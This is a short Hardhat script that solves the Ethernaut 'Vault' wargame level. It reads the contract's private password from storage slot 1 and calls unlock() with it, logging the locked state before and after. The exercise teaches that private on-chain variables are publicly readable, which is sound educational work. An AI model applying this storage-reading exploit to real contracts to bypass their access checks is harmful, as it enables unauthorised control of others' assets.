const { ethers, waffle } = require("hardhat");
const Runner = require("./lib/runner");

const provider = waffle.provider; 

Runner.run(async () => {
    
    //PLACE ADDRESS OF VAULT CONTRACT HERE (Ethernaut: contract.address)
    const contractAddr = "0x72894335b65D4c29f3ec1f462C47A58E83E06d83";     
    
    //get contract 
    const contract = await ethers.getContractAt("Vault", contractAddr);
    
    console.log("* * * ");
    console.log(`contract is ${(await contract.locked()) ? "LOCKED" : "UNLOCKED" }`); 
    
    //get password 
    const passwdRaw  = await provider.getStorageAt(contract.address, 1); 
    console.log(`password is ${passwdRaw}`); 
    
    //unlock
    await contract.unlock(passwdRaw); 
    
    console.log(`contract is ${(await contract.locked()) ? "LOCKED" : "UNLOCKED" }`); 
    
    console.log("* * * ");
});
